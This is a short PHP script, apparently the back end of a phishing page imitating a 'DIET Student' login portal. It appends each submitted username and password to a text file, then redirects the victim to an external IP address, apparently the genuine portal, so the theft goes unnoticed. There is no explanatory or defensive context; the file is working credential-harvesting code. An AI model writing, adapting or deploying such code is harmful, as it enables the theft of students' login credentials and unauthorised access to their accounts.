<?php

file_put_contents("usernames.txt", "DIET Student Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: http://103.138.0.69/ecap/');
exit();
?>